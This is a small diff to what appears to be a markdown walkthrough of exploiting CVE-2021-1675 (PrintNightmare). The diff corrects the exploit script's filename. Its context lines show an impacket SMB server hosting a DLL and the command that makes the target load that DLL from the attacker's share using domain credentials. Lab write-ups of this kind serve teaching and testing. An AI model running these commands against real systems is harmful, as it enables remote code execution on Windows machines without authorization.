@@ -33,7 +33,7 @@ impacket-smbserver -smb2support share /path/to/folder/with/DLL
 Finally, exploit the target:
 
 ```bash
-python3 CVE-2021-1675 domain.com/username:'password'@target-ip '\\your-ip\share\your.dll'
+python3 CVE-2021-1675.py domain.com/username:'password'@target-ip '\\your-ip\share\your.dll'
 ```
 
 ![successful connection](./images/Pasted%20image%2020230606100148.png)
